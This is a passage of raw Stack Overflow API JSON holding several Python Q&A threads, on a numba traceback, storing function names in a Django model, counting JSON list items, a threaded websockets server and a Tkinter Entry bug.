\"/Users/blah/anaconda/lib/python2.7/site-packages/numba/compiler.py\", line 493, in _backend\n    lowered = lowerfn()\n  File \"/Users/blah/anaconda/lib/python2.7/site-packages/numba/compiler.py\", line 471, in backend_object_mode\n    self.flags)\n  File \"/Users/blah/anaconda/lib/python2.7/site-packages/numba/compiler.py\", line 750, in py_lowering_stage\n    lower.lower()\n  File \"/Users/blah/anaconda/lib/python2.7/site-packages/numba/lowering.py\", line 82, in lower\n    self.lower_normal_function(self.fndesc)\n  File \"/Users/blah/anaconda/lib/python2.7/site-packages/numba/lowering.py\", line 114, in lower_normal_function\n    entry_block_tail = self.lower_function_body()\n  File \"/Users/blah/anaconda/lib/python2.7/site-packages/numba/lowering.py\", line 140, in lower_function_body\n    self.lower_block(block)\n  File \"/Users/blah/anaconda/lib/python2.7/site-packages/numba/lowering.py\", line 158, in lower_block\n    raise LoweringError(msg, inst.loc)\nLoweringError: Internal error:\nNotImplementedError: Unknown operator 'in'\nFile \"&lt;ipython-input-3-f51bcec7986c&gt;\", line 10\n\nFailed at object (object mode backend)\nInternal error:\nNotImplementedError: Unknown operator 'in'\nFile \"&lt;ipython-input-3-f51bcec7986c&gt;\", line 10\n\nFailed at object (object mode frontend)\nCaused By:\nTraceback (most recent call last):\n  File \"/Users/blah/anaconda/lib/python2.7/site-packages/numba/compiler.py\", line 201, in run\n    res = stage()\n  File \"/Users/blah/anaconda/lib/python2.7/site-packages/numba/compiler.py\", line 515, in stage_objectmode_backend\n    res = self._backend(lowerfn, objectmode=True)\n  File \"/Users/blah/anaconda/lib/python2.7/site-packages/numba/compiler.py\", line 493, in _backend\n    lowered = lowerfn()\n  File \"/Users/blah/anaconda/lib/python2.7/site-packages/numba/compiler.py\", line 471, in backend_object_mode\n    self.flags)\n  File \"/Users/blah/anaconda/lib/python2.7/site-packages/numba/compiler.py\", line 750, in py_lowering_stage\n    lower.lower()\n  File \"/Users/blah/anaconda/lib/python2.7/site-packages/numba/lowering.py\", line 82, in lower\n    self.lower_normal_function(self.fndesc)\n  File \"/Users/blah/anaconda/lib/python2.7/site-packages/numba/lowering.py\", line 114, in lower_normal_function\n    entry_block_tail = self.lower_function_body()\n  File \"/Users/blah/anaconda/lib/python2.7/site-packages/numba/lowering.py\", line 140, in lower_function_body\n    self.lower_block(block)\n  File \"/Users/blah/anaconda/lib/python2.7/site-packages/numba/lowering.py\", line 158, in lower_block\n    raise LoweringError(msg, inst.loc)\nLoweringError: Internal error:\nNotImplementedError: Unknown operator 'in'\nFile \"&lt;ipython-input-3-f51bcec7986c&gt;\", line 10\n\nFailed at object (object mode backend)\nInternal error:\nNotImplementedError: Unknown operator 'in'\nFile \"&lt;ipython-input-3-f51bcec7986c&gt;\", line 10\n</code></pre>\n"}, {"tags": ["python", "django", "model", "functional-programming"], "answers": [{"comments": [{"owner": {"reputation": 105, "user_id": 2948195, "user_type": "registered", "profile_image": "https://graph.facebook.com/660878146/picture?type=large", "display_name": "Vincent Alvo", "link": "https://stackoverflow.com/users/2948195/vincent-alvo"}, "edited": false, "score": 0, "creation_date": 1463077917, "post_id": 37172812, "comment_id": 61922123, "body": "Nice answer. User can&#39;t enter any fonction or code, emails are all generated from within the code. so it&#39;s quite handy to have the condition function sitting near where the email is generated. I currently have a centralised version of this email app which is a nightmare to maintain. That&#39;s why I&#39;m working on this idea.. :-)"}], "tags": [], "owner": {"reputation": 4111, "user_id": 817766, "user_type": "registered", "accept_rate": 73, "profile_image": "https://i.stack.imgur.com/eALxl.png?s=128&g=1", "display_name": "Djizeus", "link": "https://stackoverflow.com/users/817766/djizeus"}, "is_accepted": true, "score": 2, "last_activity_date": 1462999034, "creation_date": 1462999034, "answer_id": 37172812, "question_id": 37172123, "link": "https://stackoverflow.com/questions/37172123/django-store-function-in-database/37172812#37172812", "title": "Django, store function in database", "body": "<p>Storing the function name is a valid aproach, since it is actually the one used by the <a href=\"https://docs.python.org/3.1/library/pickle.html#what-can-be-pickled-and-unpickled\" rel=\"nofollow\">pickle module</a>. This has the benefit (in your case) that if you update the code of a function, it will automatically apply to existing e-mails (but be careful with backward-compatibility).</p>\n\n<p>For convenience and safety (especially if the function name could come from user inputs), you may want to keep all such functions in the same module, and store only the function name in DB, not the full import path. So you could simply import the function repository and read it with <code>getattr</code>. I imagine you will also want to give parameters to these functions. If you don't want to restrict yourself to a given number / order / type of arguments, you could store in DB a dictionary as a JSON string, and expand it with the <code>**</code> operator.</p>\n\n<pre><code>import my_app.func_store as store\nimport json\n\nfunc = getattr(store, self.conditional)\nparams = json.loads(self.conditional_params)\nif func(**params):\n    function_send_email()\n</code></pre>\n"}], "owner": {"reputation": 105, "user_id": 2948195, "user_type": "registered", "profile_image": "https://graph.facebook.com/660878146/picture?type=large", "display_name": "Vincent Alvo", "link": "https://stackoverflow.com/users/2948195/vincent-alvo"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 830, "favorite_count": 0, "accepted_answer_id": 37172812, "answer_count": 1, "score": 1, "last_activity_date": 1463050425, "creation_date": 1462996529, "last_edit_date": 1463050425, "question_id": 37172123, "link": "https://stackoverflow.com/questions/37172123/django-store-function-in-database", "title": "Django, store function in database", "body": "<p>I'm trying to find a way to store a function in a Django Model.\nMy use case is an emailer system with planned and conditional sending. </p>\n\n<p>\"send this email tomorrow if John has not logged in\".</p>\n\n<p>Ideally I would like to create emails with a test function field.</p>\n\n<pre><code>def my_test(instance):\n  if (now() - instance.user.last_login) &gt; timedelta(days=1):\n    return False\n  return True\n\nEmail(send_later_date=now() + timedelta(days=1),\n      conditional=my_test)\n</code></pre>\n\n<p>Here is what I'm thinking about</p>\n\n<pre><code>import importlib\n\nEmail(send_later_date=now() + timedelta(days=1),\n      conditional='my_app.views.my_test')\n\n\n\nclass Email(models.Model):\n  send_later_date = models.DateTimeField(null=True, blank=True)\n  conditional = models.TextField()\n\n  def send_email(self):\n    if self.send_later_date &lt; now():\n      if not self.conditional:\n        function_send_email()\n      else:\n        function_string = self.conditional\n        mod_name, func_name = function_string.rsplit('.',1)\n        mod = importlib.import_module(mod_name)\n        func = getattr(mod, func_name)\n        if func():\n          function_send_email()\n</code></pre>\n\n<p>How would you do that? I was thinking of storing the function name in a Text field. How would you run it once needed? <code>ImportLib</code> seems interesting...</p>\n"}, {"tags": ["python", "json", "dictionary"], "comments": [{"owner": {"reputation": 31205, "user_id": 2482744, "user_type": "registered", "accept_rate": 52, "profile_image": "https://i.stack.imgur.com/OQPNY.png?s=128&g=1", "display_name": "Alex Hall", "link": "https://stackoverflow.com/users/2482744/alex-hall"}, "edited": false, "score": 0, "creation_date": 1462996729, "post_id": 37172114, "comment_id": 61879041, "body": "Where does this string <code>RestaurantsHistory</code> come from? It&#39;s not in the JSON file."}, {"owner": {"reputation": 55248, "user_id": 642070, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/0c280b71b3187d1cc113a6e302b414b9?s=128&d=identicon&r=PG", "display_name": "tdelaney", "link": "https://stackoverflow.com/users/642070/tdelaney"}, "edited": false, "score": 0, "creation_date": 1462996731, "post_id": 37172114, "comment_id": 61879042, "body": "The dictionaries are in <code>lists</code>, so <code>print len(theDataHistory[&#39;lists&#39;])</code> should do it."}, {"owner": {"reputation": 2321, "user_id": 2377489, "user_type": "registered", "accept_rate": 62, "profile_image": "https://i.stack.imgur.com/78lEW.jpg?s=128&g=1", "display_name": "quapka", "link": "https://stackoverflow.com/users/2377489/quapka"}, "edited": false, "score": 0, "creation_date": 1462997025, "post_id": 37172114, "comment_id": 61879192, "body": "I&#39;ve added an answer, but then I&#39;ve realized, that I misinterpreted your question, asking about the number of <code>dict</code>s not the number 9 in one of the <code>dict</code>. So I&#39;ve deleted the answer."}, {"owner": {"reputation": 31, "user_id": 6311716, "user_type": "registered", "profile_image": "https://lh6.googleusercontent.com/-IS3_BEWVsTQ/AAAAAAAAAAI/AAAAAAAALT4/dkD-J1f4Z44/photo.jpg?sz=128", "display_name": "Rusher", "link": "https://stackoverflow.com/users/6311716/rusher"}, "edited": false, "score": 0, "creation_date": 1463001102, "post_id": 37172114, "comment_id": 61881334, "body": "Thanks guys! soo fast! i frogot to replace RestaurantsHistory. sorry for that."}], "answers": [{"comments": [{"owner": {"reputation": 442, "user_id": 2432790, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/33e869cf1353248c819ef2c6e7d88fca?s=128&d=identicon&r=PG&f=1", "display_name": "LAL", "link": "https://stackoverflow.com/users/2432790/lal"}, "edited": false, "score": 1, "creation_date": 1462997066, "post_id": 37172181, "comment_id": 61879222, "body": "Actually, in his example he uses <code>lists</code> instead of <code>list</code>. Beside this typo, your solution works."}, {"owner": {"reputation": 7130, "user_id": 1429073, "user_type": "registered", "accept_rate": 53, "profile_image": "https://www.gravatar.com/avatar/6cf3963f7758df3b57542c790e598630?s=128&d=identicon&r=PG&f=1", "display_name": "DevLounge", "link": "https://stackoverflow.com/users/1429073/devlounge"}, "reply_to_user": {"reputation": 442, "user_id": 2432790, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/33e869cf1353248c819ef2c6e7d88fca?s=128&d=identicon&r=PG&f=1", "display_name": "LAL", "link": "https://stackoverflow.com/users/2432790/lal"}, "edited": false, "score": 1, "creation_date": 1462997178, "post_id": 37172181, "comment_id": 61879277, "body": "I also use <code>lists</code>, see my answer again ;-)"}], "tags": [], "owner": {"reputation": 7130, "user_id": 1429073, "user_type": "registered", "accept_rate": 53, "profile_image": "https://www.gravatar.com/avatar/6cf3963f7758df3b57542c790e598630?s=128&d=identicon&r=PG&f=1", "display_name": "DevLounge", "link": "https://stackoverflow.com/users/1429073/devlounge"}, "is_accepted": true, "score": 2, "last_activity_date": 1462996804, "last_edit_date": 1462996804, "creation_date": 1462996704, "answer_id": 37172181, "question_id": 37172114, "link": "https://stackoverflow.com/questions/37172114/count-the-number-of-dictionaries-in-a-string-python/37172181#37172181", "title": "count the number of dictionaries in a string python", "body": "<p>Maybe this, but no idea where 'RestaurantsHistory' comes from:</p>\n\n<pre><code>print len(theDataHistory['RestaurantsHistory']['lists'])\n</code></pre>\n\n<p>otherwise this:</p>\n\n<pre><code>print len(theDataHistory['lists'])\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 31205, "user_id": 2482744, "user_type": "registered", "accept_rate": 52, "profile_image": "https://i.stack.imgur.com/OQPNY.png?s=128&g=1", "display_name": "Alex Hall", "link": "https://stackoverflow.com/users/2482744/alex-hall"}, "is_accepted": false, "score": 1, "last_activity_date": 1462997005, "creation_date": 1462997005, "answer_id": 37172272, "question_id": 37172114, "link": "https://stackoverflow.com/questions/37172114/count-the-number-of-dictionaries-in-a-string-python/37172272#37172272", "title": "count the number of dictionaries in a string python", "body": "<p>If you have a list (or tuple, set, dictionary, string, or many other possibilities) of anything (even a mixture of things), <code>len(the_list)</code> gives the number of elements. <code>len</code> is short for length.</p>\n\n<p>Your sample JSON results in a dictionary with one key <code>\"lists\"</code>. You can get to the value with <code>json_data[\"lists\"]</code> and the number of elements will thus be <code>len(json_data[\"lists\"])</code>. Here <code>json_data</code> is either <code>theDataHistory</code> or <code>theDataHistory['RestaurantsHistory']</code>, it's not clear what happened at the end of your code since there's no <code>RestaurantsHistory</code> in the sample.</p>\n"}, {"tags": [], "owner": {"reputation": 442, "user_id": 2432790, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/33e869cf1353248c819ef2c6e7d88fca?s=128&d=identicon&r=PG&f=1", "display_name": "LAL", "link": "https://stackoverflow.com/users/2432790/lal"}, "is_accepted": false, "score": 0, "last_activity_date": 1462997526, "creation_date": 1462997526, "answer_id": 37172413, "question_id": 37172114, "link": "https://stackoverflow.com/questions/37172114/count-the-number-of-dictionaries-in-a-string-python/37172413#37172413", "title": "count the number of dictionaries in a string python", "body": "<p><strong>len(s)</strong></p>\n\n<blockquote>\n  <p>Return the length (the number of items) of an object. The argument may\n  be a sequence (such as a string, bytes, tuple, list, or range) or a\n  collection (such as a dictionary, set, or frozen set).</p>\n</blockquote>\n\n<p><a href=\"https://docs.python.org/2/library/functions.html#len\" rel=\"nofollow\">ref doc.</a> </p>\n\n<pre><code>dict = {'lists':[{'number':1,'name':'A'},\n                 {'number':2,'name':'B'},\n                 {'number':3,'name':'C'}]\n       }\nprint len(dict) # outputs 1\nprint len(dict['lists']) # outputs 3\nprint len(dict['lists'][0]) # output 2\n</code></pre>\n"}], "owner": {"reputation": 31, "user_id": 6311716, "user_type": "registered", "profile_image": "https://lh6.googleusercontent.com/-IS3_BEWVsTQ/AAAAAAAAAAI/AAAAAAAALT4/dkD-J1f4Z44/photo.jpg?sz=128", "display_name": "Rusher", "link": "https://stackoverflow.com/users/6311716/rusher"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 123, "favorite_count": 0, "accepted_answer_id": 37172181, "answer_count": 3, "score": 0, "last_activity_date": 1462997526, "creation_date": 1462996488, "last_edit_date": 1462996551, "question_id": 37172114, "link": "https://stackoverflow.com/questions/37172114/count-the-number-of-dictionaries-in-a-string-python", "title": "count the number of dictionaries in a string python", "body": "<p>I am new to Python and coding in general. my question is how to find the numbers of  dictionaries in a this string.\nThis is a file called dataHistory.json</p>\n\n<pre><code>{\n\"lists\": [\n        {\n            \"number\": 1,\n            \"name\": \"A\"\n        },\n        {\n            \"number\": 2,\n            \"name\": \"B\"\n        },\n        {\n            \"number\": 3,\n            \"name\": \"C\"\n        },\n        {\n            \"number\": 4,\n            \"name\": \"D\"\n        },\n        {\n            \"number\": 5,\n            \"name\": \"E\"\n        },\n        {\n            \"number\": 6,\n            \"name\": \"F\"\n        },\n        {\n            \"number\": 7,\n            \"name\": \"G\"\n        },\n        {\n            \"number\": 8,\n            \"name\": \"H\"\n        },\n        {\n            \"number\": 9,\n            \"name\": \"I\"\n        },\n\n    ]\n}\n</code></pre>\n\n<p>The result I want to get is a number to print 9</p>\n\n<p>also as a reminder dataHistory.json will add in more dictionaries. </p>\n\n<p>My Code I started.</p>\n\n<pre><code>    def _get_data_history(self):\n        theHistory = open(self.history_path)\n        holdHistory = json.load(theHistory)\n        theHistory.close()\n        return holdHistory\n\ntheDataHistory = obj._get_data_history()\nprint theDataHistory['RestaurantsHistory'] # stuck here\n</code></pre>\n\n<p>Thanks</p>\n"}, {"tags": ["python", "multithreading", "websocket"], "answers": [{"comments": [{"owner": {"reputation": 127, "user_id": 3290167, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/fdfa9dd3939a4acee4c54e4d16fda366?s=128&d=identicon&r=PG", "display_name": "TheoryX", "link": "https://stackoverflow.com/users/3290167/theoryx"}, "edited": false, "score": 1, "creation_date": 1562236016, "post_id": 37216830, "comment_id": 100318971, "body": "It&#39;s been a while since you posted the answer. Have you maybe developed your solution? I am doing something similar at the moment and would like to save myself some trouble :)"}, {"owner": {"reputation": 111, "user_id": 5012322, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/39f8b2123890582b96ebe9c1c917fe80?s=128&d=identicon&r=PG&f=1", "display_name": "DC_AC", "link": "https://stackoverflow.com/users/5012322/dc-ac"}, "edited": false, "score": 0, "creation_date": 1603290459, "post_id": 37216830, "comment_id": 113991082, "body": "How did you end up closing your ws server and loop? I&#39;m having some threads hanging when the <code>KeyboardInterrupt</code> is raised."}, {"owner": {"reputation": 141, "user_id": 4966569, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/d2213441629d942b7d254e5cadb15794?s=128&d=identicon&r=PG&f=1", "display_name": "Cl&#233;ment de l&#39;Hamaide", "link": "https://stackoverflow.com/users/4966569/cl%c3%a9ment-de-lhamaide"}, "edited": false, "score": 0, "creation_date": 1603476015, "post_id": 37216830, "comment_id": 114059528, "body": "@DC_ACexcept KeyboardInterrupt:     stopFlag = True     ws_server.close()     loop.stop()     print(&quot;Exiting program...&quot;)"}], "tags": [], "owner": {"reputation": 141, "user_id": 4966569, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/d2213441629d942b7d254e5cadb15794?s=128&d=identicon&r=PG&f=1", "display_name": "Cl&#233;ment de l&#39;Hamaide", "link": "https://stackoverflow.com/users/4966569/cl%c3%a9ment-de-lhamaide"}, "is_accepted": false, "score": 7, "last_activity_date": 1463163500, "creation_date": 1463163500, "answer_id": 37216830, "question_id": 37172006, "link": "https://stackoverflow.com/questions/37172006/python-3-threaded-websockets-server/37216830#37216830", "title": "Python 3 Threaded websockets server", "body": "<p>Finally I got it !\nIt required Python 3.5.1 (while my distro provide only 3.4.3) and some help from Aymeric, the author of the websockets library (thanks to him).</p>\n\n<pre><code>#!/usr/bin/env python3\nimport signal, sys\nsys.path.append('.')\nimport time\nimport websockets\nimport asyncio\nimport threading\n\n\nstopFlag = False\n\n\n\nclass GPSWorker (threading.Thread):\n  def __init__(self):\n    threading.Thread.__init__(self)\n    self.data = 0\n    self.lastData = 0\n    self.inc = 0\n\n  # Simulate GPS data\n  def run(self):\n    while not stopFlag:\n      self.data = self.inc\n      self.inc += 1\n      time.sleep(1)\n\n  def get(self):\n    if self.lastData is not self.data:\n      self.lastData = self.data\n      return self.data\n\n\n\nclass IMUWorker (threading.Thread):\n  def __init__(self):\n    threading.Thread.__init__(self)\n    self.data = 0\n    self.lastData = 0\n    self.inc = 0\n\n  # Simulate IMU data\n  def run(self):\n    while not stopFlag:\n      self.data = self.inc\n      self.inc += 1\n      time.sleep(0.04)\n\n  def get(self):\n    if self.lastData is not self.data:\n      self.lastData = self.data\n      return self.data\n\n\n\nclass MSGWorker (threading.Thread):\n  def __init__(self):\n    threading.Thread.__init__(self)\n    self.connected = set()\n\n  def run(self):\n    while not stopFlag:\n      data = gpsWorker.get()\n      if data:\n        self.sendData('{\"GPS\": \"%s\"}' % data)\n\n      data = imuWorker.get()\n      if data:\n        self.sendData('{\"IMU\": \"%s\"}' % data)\n\n      time.sleep(0.04)\n\n  async def handler(self, websocket, path):\n    self.connected.add(websocket)\n    try:\n      await websocket.recv()\n    except websockets.exceptions.ConnectionClosed:\n      pass\n    finally:\n      self.connected.remove(websocket)\n\n  def sendData(self, data):\n    for websocket in self.connected.copy():\n      print(\"Sending data: %s\" % data)\n      coro = websocket.send(data)\n      future = asyncio.run_coroutine_threadsafe(coro, loop)\n\n\n\nif __name__ == \"__main__\":\n  print('aeroPi server')\n  gpsWorker = GPSWorker()\n  imuWorker = IMUWorker()\n  msgWorker = MSGWorker()\n\n  try:\n    gpsWorker.start()\n    imuWorker.start()\n    msgWorker.start()\n\n    ws_server = websockets.serve(msgWorker.handler, '0.0.0.0', 7700)\n    loop = asyncio.get_event_loop()\n    loop.run_until_complete(ws_server)\n    loop.run_forever()\n  except KeyboardInterrupt:\n    stopFlag = True\n    #TODO: close ws server and loop correctely\n    print(\"Exiting program...\")\n</code></pre>\n\n<p>Regards,\nCl\u00e9ment</p>\n"}], "owner": {"reputation": 141, "user_id": 4966569, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/d2213441629d942b7d254e5cadb15794?s=128&d=identicon&r=PG&f=1", "display_name": "Cl&#233;ment de l&#39;Hamaide", "link": "https://stackoverflow.com/users/4966569/cl%c3%a9ment-de-lhamaide"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 8062, "favorite_count": 4, "answer_count": 1, "score": 5, "last_activity_date": 1463163500, "creation_date": 1462996069, "question_id": 37172006, "link": "https://stackoverflow.com/questions/37172006/python-3-threaded-websockets-server", "title": "Python 3 Threaded websockets server", "body": "<p>I'm building a Websocket server application in python 3. I'm using this implementation: <a href=\"https://websockets.readthedocs.io/\" rel=\"noreferrer\">https://websockets.readthedocs.io/</a></p>\n\n<p>Basically I want to manage multiple client.\nAlso I want to send data from 2 different thread (one for GPS + one for IMU)\nGPS thread is refreshed 1Hz, while IMU thread is refresh at 25Hz</p>\n\n<p>My problem is in MSGWorker.sendData method: as soon as I uncomment the line @asyncio.coroutine and yield from websocket.send('{\"GPS\": \"%s\"}' % data) the whole method does nothing (no print(\"Send data: foo\") in terminal)</p>\n\n<p>However with these two line commented my code works as I expect except that I send nothing through the websocket.</p>\n\n<p>But, of course, my goal is to send data through the websocket, I just don't understand why it doesn't work ? Any idea ?</p>\n\n<p>server.py</p>\n\n<pre><code>#!/usr/bin/env python3\nimport signal, sys\nsys.path.append('.')\nimport time\nimport websockets\nimport asyncio\nimport threading\n\nconnected = set()\nstopFlag = False\n\n\n\nclass GPSWorker (threading.Thread):\n  def __init__(self):\n    threading.Thread.__init__(self)\n    self.data = 0\n    self.lastData = 0\n    self.inc = 0\n\n  # Simulate GPS data\n  def run(self):\n    while not stopFlag:\n      self.data = self.inc\n      self.inc += 1\n      time.sleep(1)\n\n  def get(self):\n    if self.lastData is not self.data:\n      self.lastData = self.data\n      return self.data\n\n\n\nclass IMUWorker (threading.Thread):\n  def __init__(self):\n    threading.Thread.__init__(self)\n    self.data = 0\n    self.lastData = 0\n    self.inc = 0\n\n  # Simulate IMU data\n  def run(self):\n    while not stopFlag:\n      self.data = self.inc\n      self.inc += 1\n      time.sleep(0.04)\n\n  def get(self):\n    if self.lastData is not self.data:\n      self.lastData = self.data\n      return self.data\n\n\n\nclass MSGWorker (threading.Thread):\n  def __init__(self):\n    threading.Thread.__init__(self)\n\n  def run(self):\n    while not stopFlag:\n      data = gpsWorker.get()\n      if data:\n        self.sendData('{\"GPS\": \"%s\"}' % data)          \n\n      data = imuWorker.get()\n      if data:\n        self.sendData('{\"IMU\": \"%s\"}' % data)\n\n      time.sleep(0.04)\n\n  #@asyncio.coroutine\n  def sendData(self, data):\n    for websocket in connected.copy():\n      print(\"Sending data: %s\" % data)\n      #yield from websocket.send('{\"GPS\": \"%s\"}' % data)\n\n\n\n@asyncio.coroutine\ndef handler(websocket, path):\n  global connected\n  connected.add(websocket)\n  #TODO: handle client disconnection\n  # i.e connected.remove(websocket)\n\n\n\nif __name__ == \"__main__\":\n  print('aeroPi server')\n  gpsWorker = GPSWorker()\n  imuWorker = IMUWorker()\n  msgWorker = MSGWorker()\n\n  try:\n    gpsWorker.start()\n    imuWorker.start()\n    msgWorker.start()\n\n    start_server = websockets.serve(handler, 'localhost', 7700)\n    loop = asyncio.get_event_loop()\n    loop.run_until_complete(start_server)\n    loop.run_forever()\n\n  except KeyboardInterrupt:\n    stopFlag = True\n    loop.close()\n    print(\"Exiting program...\")\n</code></pre>\n\n<p>client.html</p>\n\n<pre><code>&lt;!doctype html&gt;\n&lt;html&gt;\n&lt;head&gt;\n  &lt;meta charset=\"UTF-8\" /&gt;\n&lt;/head&gt;\n&lt;body&gt;\n&lt;/body&gt;\n&lt;/html&gt;\n&lt;script type=\"text/javascript\"&gt;\n  var ws = new WebSocket(\"ws://localhost:7700\", 'json');\n  ws.onmessage = function (e) {\n    var data = JSON.parse(e.data);\n    console.log(data);\n  };\n&lt;/script&gt;\n</code></pre>\n\n<p>Thanks you for your help</p>\n"}, {"tags": ["python", "user-interface", "tkinter", "tkinter-entry"], "comments": [{"owner": {"reputation": 4170, "user_id": 5094044, "user_type": "registered", "accept_rate": 60, "profile_image": "https://i.stack.imgur.com/Xr8RF.gif?s=128&g=1", "display_name": "coralvanda", "link": "https://stackoverflow.com/users/5094044/coralvanda"}, "edited": false, "score": 0, "creation_date": 1462996669, "post_id": 37171990, "comment_id": 61879003, "body": "I&#39;m having a heck of a time just getting this to run anything at all.  Is there any other code at all you can include?  I imagine there must be an <code>import tkinter</code> or something like that.  Also, pretty sure you&#39;ll need to <code>.pack()</code> in the various objects you&#39;ve made, like <code>ex1</code>."}], "answers": [{"tags": [], "owner": {"reputation": 15789, "user_id": 722804, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/3qBY9.png?s=128&g=1", "display_name": "Terry Jan Reedy", "link": "https://stackoverflow.com/users/722804/terry-jan-reedy"}, "is_accepted": false, "score": 1, "last_activity_date": 1462997954, "creation_date": 1462997954, "answer_id": 37172535, "question_id": 37171990, "link": "https://stackoverflow.com/questions/37171990/tkinter-retrieving-value-from-an-entry/37172535#37172535", "title": "Tkinter, retrieving value from an entry", "body": "<p>Please read how to post a proper <a href=\"https://stackoverflow.com/help/mcve\">MCVE</a></p>\n\n<p>Here is one for your problem:</p>\n\n<pre><code>from tkinter import Tk, Entry\n\nroot = Tk()\nent = Entry(root).pack()\nprint(ent)\nprint(ent.get())\n</code></pre>\n\n<p>This prints</p>\n\n<pre><code>None\nTraceback (most recent call last):\n  File \"F:\\Python\\mypy\\tem.py\", line 6, in &lt;module&gt;\n    print(ent.get())\nAttributeError: 'NoneType' object has no attribute 'get'\n</code></pre>\n\n<p>At this point, it should be obvious that <code>.pack()</code> returns <code>None</code>.  So instead bind the widget returned by Entry.</p>\n\n<pre><code>from tkinter import Tk, Entry\n\nroot = Tk()\nent = Entry(root)\nent.pack()\nprint(ent)\nprint(ent.get())\n</code></pre>\n\n<p>to get</p>\n\n<pre><code>.2425099144832\ngot  .\n</code></pre>\n"}], "owner": {"reputation": 1, "user_id": 6322278, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/aab5568bdd369d5732d48afc57489688?s=128&d=identicon&r=PG&f=1", "display_name": "barty", "link": "https://stackoverflow.com/users/6322278/barty"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 419, "favorite_count": 0, "closed_date": 1463002033, "answer_count": 1, "score": -1, "last_activity_date": 1504200357, "creation_date": 1462996012, "last_edit_date": 1504200357, "question_id": 37171990, "link": "https://stackoverflow.com/questions/37171990/tkinter-retrieving-value-from-an-entry", "closed_reason": "Duplicate", "title": "Tkinter, retrieving value from an entry", "body": "<p>I am making a simple GUI program in python using Tkinter. The problem is that when I try to retrieve the value from my Entry using a button, it comes back with an <code>error()</code>:</p>\n\n<pre><code>print(ex1.get())\nAttributeError: 'NoneType' object has no attribute 'get'\n</code></pre>\n\n<p>How to avoid this?</p>\n\n<p>This is my code: </p>\n\n<pre><code>root = Tk()\n\nroot.minsize(300,300)\nroot.maxsize(300,300)\n\n\nn = ttk.Notebook()\n\nf1 = Frame(n,height=280,width=280)\nf1.propagate(0)\nlx1 = Label(f1,text=\"x\",width=5).grid(row = 1,column=0) \nex1 = Entry(f1,width = 10).grid(row = 1,column = 1)\n\nly1 = Label(f1,text=\"y\",width=5).grid(row=3,column=0)\ney1 = Entry(f1,width = 10).grid(row=3,column = 1)\n\ndef value():\n    print(ex1.get())\n\n\nBcreate = Button(f1,text=\"CREATE\",command=value).grid(row = 10,column =  5)\nn.add(f1,text=\"add point\")\n\nf2 = Frame(n)\nn.add(f2,text=\"draw line\")\n\n\nn.pack()\n</code></pre>\n"}, {"tags": ["python", "split"], "comments": [{"owner": {"reputation": 4818, "user_id": 4063532, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/ycJy2.jpg?s=128&g=1", "display_name": "Oussema Aroua", "link": "https://stackoverflow.com/users/4063532/oussema-aroua"}, "edited": false, "score": 1, "creation_date": 1462996337, "post_id": 37171980, "comment_id": 61878796, "body": "Your question is not clear, you decalre the same varibale &#39;phones&#39; twice"}, {"owner": {"reputation": 31205, "user_id": 2482744, "user_type": "registered", "accept_rate": 52, "profile_image": "https://i.stack.imgur.com/OQPNY.png?s=128&g=1", "display_name": "Alex Hall", "link": "https://stackoverflow.com/users/2482744/alex-hall"}, "edited": false, "score": 0, "creation_date": 1462996337, "post_id": 37171980, "comment_id": 61878799, "body": "Read up on regular expressions."}, {"owner": {"reputation": 21133, "user_id": 1084416, "user_type": "registered", "accept_rate": 80, "profile_image": "https://i.stack.imgur.com/RLhZZ.jpg?s=128&g=1", "display_name": "Peter Wood", "link": "https://stackoverflow.com/users/1084416/peter-wood"}, "edited": false, "score": 0, "creation_date": 1462996559, "post_id": 37171980, "comment_id": 61878943, "body": "Does your code not work? How do you know?"}, {"owner": {"reputation": 21991, "user_id": 75103, "user_type": "registered", "accept_rate": 85, "profile_image": "https://www.gravatar.com/avatar/7dfc20ceb7d6e1686d9be8f68469afa7?s=128&d=identicon&r=PG", "display_name": "thebjorn", "link": "https://stackoverflow.com/users/75103/thebjorn"}, "edited": false, "score": 1, "creation_date": 1462996643, "post_id": 37171980, "comment_id": 61878988, "body": "not related to your question, but the Pythonic way to write your if is <code>if 1&lt;= len(phones) &lt;= 100:</code>"}, {"owner": {"reputation": 2585, "user_id": 3061689, "user_type": "registered", "accept_rate": 44, "profile_image": "https://i.stack.imgur.com/kUP4K.jpg?s=128&g=1", "display_name": "Eddwin Paz", "link": "https://stackoverflow.com/users/3061689/eddwin-paz"}, "edited": false, "score": 0, "creation_date": 1463052110, "post_id": 37171980, "comment_id": 61903532, "body": "The code works, the issue is that I want to avoid user from input characters that crashes my app or makes it work not properlly. I want to do is grab all this phones and loop then on a Redis Message Queue Job. &quot;queue_sms&quot; But I need validation before sending them to the job"}, {"owner": {"reputation": 2585, "user_id": 3061689, "user_type": "registered", "accept_rate": 44, "profile_image": "https://i.stack.imgur.com/kUP4K.jpg?s=128&g=1", "display_name": "Eddwin Paz", "link": "https://stackoverflow.com/users/3061689/eddwin-paz"}, "edited": false, "score": 0, "creation_date": 1463052184, "post_id": 37171980, "comment_id": 61903591, "body": "if a user passes ,,,,,,,00000000,00000000,00000000 this will make a error for me. or What ever settings of string that does not fit my standard. I think I need a Mask that would return true, false if its compliant with String, String, String"}], "answers": [{"tags": [], "owner": {"reputation": 31205, "user_id": 2482744, "user_type": "registered", "accept_rate": 52, "profile_image": "https://i.stack.imgur.com/OQPNY.png?s=128&g=1", "display_name": "Alex Hall", "link": "https://stackoverflow.com/users/2482744/alex-hall"}, "is_accepted": false, "score": 0, 